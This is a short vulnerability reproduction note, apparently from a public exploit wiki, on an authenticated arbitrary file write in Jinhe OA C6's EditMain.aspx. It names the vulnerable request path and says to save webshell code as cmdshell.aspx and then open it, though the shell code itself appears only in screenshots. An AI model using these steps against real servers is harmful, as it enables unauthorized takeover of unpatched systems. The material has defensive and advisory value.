# Jinhe OA C6 EditMain.aspx background file writing vulnerability

## Vulnerability Description

Jinhe OA C6 EditMain.aspx has an arbitrary file writing vulnerability, through which malicious files can be written to obtain server permissions

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Kin and OA C6</span>

## Network surveying and mapping



## Vulnerability reappears

Vulnerability triggering requires background permissions

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1628350407372-c8b8b96e-c7cd-47e3-acee-90bb3d055866.png)

Access vulnerability point `/C6/JHSoft.Web.Portal/EditMain.aspx?id=cmdshell.aspx`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1628350462105-61aa0f6b-0712-4f8b-87c2-c8a5cbf279e2.png)

Write webshell code to save

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1628350735733-a56b0cd0-92ff-4e1f-90bb-e602b3fec72d.png)

Visit again `/C6/JHSoft.Web.Portal/Default/cmdshell.aspx`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1628350972563-90ebac52-7c40-4b32-ad3a-e1ea2927b071.png)